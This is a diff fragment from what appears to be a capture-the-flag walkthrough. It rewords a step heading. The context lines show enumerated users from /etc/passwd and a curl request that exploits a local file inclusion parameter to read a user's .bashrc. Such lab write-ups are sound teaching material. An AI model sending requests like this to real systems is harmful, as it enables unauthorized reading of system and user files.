@@ -76,7 +76,7 @@ red:x:1001:1001::/home/red:/bin/bash
 ```
 ###### Ha ha, we get users, blue and red.
 Step 3:<br>
-###### Lets try to get get files in users directories
+###### Lets try to get files in blue's home directory
 ```
 curl http://target-ip/index.php?page=file:///home/blue/.bashrc
 ```
